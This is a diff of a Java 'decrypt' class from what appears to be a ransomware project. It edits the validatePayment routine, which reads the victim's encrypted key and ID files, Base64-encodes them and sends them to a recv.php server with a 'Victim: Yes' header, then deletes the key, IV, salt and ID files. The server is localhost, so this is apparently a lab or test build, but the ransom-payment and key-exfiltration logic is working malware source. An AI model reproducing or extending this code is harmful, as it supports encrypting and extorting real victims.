@@ -96,19 +96,19 @@ class decrypt {
 
     static boolean validatePayment() throws Exception{
         //ID is the victim's ID
-        String id = encrypt.Identifier();
-        System.out.println(id);
         File file = new File("/tmp/tmp/key.enc");
         File file2 = new File("/tmp/tmp/id.enc");
         String encoded_key;
 		String modifiedKey;
 		String encoded_id;
+		String modifiedId;
 		byte[] encKey = Files.readAllBytes(file.toPath());
 		byte[] encid = Files.readAllBytes(file2.toPath());
 		encoded_key = Base64.getEncoder().encodeToString(encKey);
 		encoded_id = Base64.getEncoder().encodeToString(encid);
 		modifiedKey = encoded_key.replace('+', '-');
-		URL obj = new URL("http://127.0.0.1/recv.php?decrypt="+modifiedKey+"&id="+encoded_id);
+		modifiedId = encoded_id.replace('+','-');
+		URL obj = new URL("http://127.0.0.1/recv.php?decrypt="+modifiedKey+"&id="+modifiedId);
 		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
 		con.setRequestMethod("GET");
 		con.addRequestProperty("Victim", "Yes");
@@ -139,6 +139,8 @@ class decrypt {
 		f = new File("/tmp/tmp/iv.enc");
 		f.delete();
 		f = new File("/tmp/tmp/salt.enc");
+		f.delete();
+		f = new File("/tmp/tmp/id.enc");
 		f.delete();
 	}
 
